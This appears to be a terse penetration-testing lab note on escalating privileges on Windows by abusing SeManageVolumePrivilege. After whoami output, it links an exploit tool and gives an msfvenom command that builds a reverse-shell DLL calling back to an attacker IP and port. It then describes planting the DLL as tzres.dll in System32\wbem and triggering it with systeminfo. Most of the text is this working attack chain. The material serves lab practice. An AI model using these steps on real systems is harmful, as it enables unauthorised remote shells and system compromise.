whoami /priv

PRIVILEGES INFORMATION
\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-\-

Privilege Name                Description                      State   
============================= ================================ ========
SeMachineAccountPrivilege     Add workstations to domain       Disabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled 
**SeManageVolumePrivilege       Perform volume maintenance tasks Disabled**
SeIncreaseWorkingSetPrivilege Increase a process working set   Disabled

-  [https://github.com/CsEnox/SeManageVolumeExploit](#https://github.com/CsEnox/SeManageVolumeExploit)


-  send SeManageVolumeExploit\.exeover to victim machine \(this allows us to write in C: drive and potentially inject a crafted DLL file\)
-  systeminfoutilises tzres\.dllwhile executing and is stored in C:\\Windows\\System32\\wbem\\

-  msfvenom \-p windows/x64/shell\_reverse\_tcp LHOST=192\.168\.45\.203 LPORT=4411 \-f dll \> tzres\.dll
-  send tzres\.dll to victim machine and store it in C:\\Windows\\System32\\wbem\\

-  systeminfo
whoami
nt authority\\network service
